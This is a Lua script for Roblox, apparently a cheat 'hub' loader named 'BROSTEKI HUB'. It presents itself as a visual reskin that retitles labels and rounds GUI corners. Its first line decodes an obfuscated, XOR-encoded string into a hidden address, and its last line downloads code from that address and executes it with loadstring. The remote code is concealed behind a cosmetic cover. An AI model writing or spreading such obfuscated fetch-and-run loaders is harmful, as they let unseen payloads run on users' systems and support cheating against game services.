
--[[ STAGE 2: VISUAL CORE ]]
local olJ0L79ifrGO="\136\127\130\137\139\197\213\216\150\172\153\227\175\176\166\181\173\193\179\184\201\189\209\200\202\199\219\211\208\025\233\224\229\038\232\236\238\000\247\002\253\012\000\000\016\074\024\011\025\034\029\020\045\035\038\104\045\060\055\051\119\093\075\070\068\081\068\086\093\086\101\127\092\084\113\128\115\101\115\109\108\134\149\124\121\125\145\146\155\156\154\205\165\207\171\215\224\229\170\166\189"local KXxEC49Ap44mrAblAuM=126 local Q4uftG3JPvE0E69h=103 local RF_g1gjW_6Upth5=0 local EbnBFBtaCr_55=3 local lRLytIDLgR1cuwIn6fO=8 local Ziv14gAacMuetc=false local aiAHa_Su0_oP0w39sYr=bit32 and bit32.bxor if not aiAHa_Su0_oP0w39sYr then aiAHa_Su0_oP0w39sYr=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local FMmiNbNmp2a3VKc3Z04Z1Y={}for DJPO_F56_A6Nvc8wOU=1,#olJ0L79ifrGO do local QmtsbdQpxNX5XnLZu7yM=string.byte(olJ0L79ifrGO,DJPO_F56_A6Nvc8wOU)local ZJ8rtll8zgASl4RduT=(Q4uftG3JPvE0E69h+(DJPO_F56_A6Nvc8wOU*EbnBFBtaCr_55)+lRLytIDLgR1cuwIn6fO)%256 if RF_g1gjW_6Upth5==0 then QmtsbdQpxNX5XnLZu7yM=(QmtsbdQpxNX5XnLZu7yM-ZJ8rtll8zgASl4RduT)%256 FMmiNbNmp2a3VKc3Z04Z1Y[DJPO_F56_A6Nvc8wOU]=string.char(aiAHa_Su0_oP0w39sYr(QmtsbdQpxNX5XnLZu7yM,KXxEC49Ap44mrAblAuM))else QmtsbdQpxNX5XnLZu7yM=aiAHa_Su0_oP0w39sYr(QmtsbdQpxNX5XnLZu7yM,KXxEC49Ap44mrAblAuM)FMmiNbNmp2a3VKc3Z04Z1Y[DJPO_F56_A6Nvc8wOU]=string.char((QmtsbdQpxNX5XnLZu7yM-ZJ8rtll8zgASl4RduT)%256)end end local YzlnfnlGhKo62v=table.concat(FMmiNbNmp2a3VKc3Z04Z1Y)if Ziv14gAacMuetc then YzlnfnlGhKo62v=string.reverse(YzlnfnlGhKo62v)end local z_QB65woUJCA3x8=YzlnfnlGhKo62v
local HubName = "BROSTEKI HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(z_QB65woUJCA3x8))()
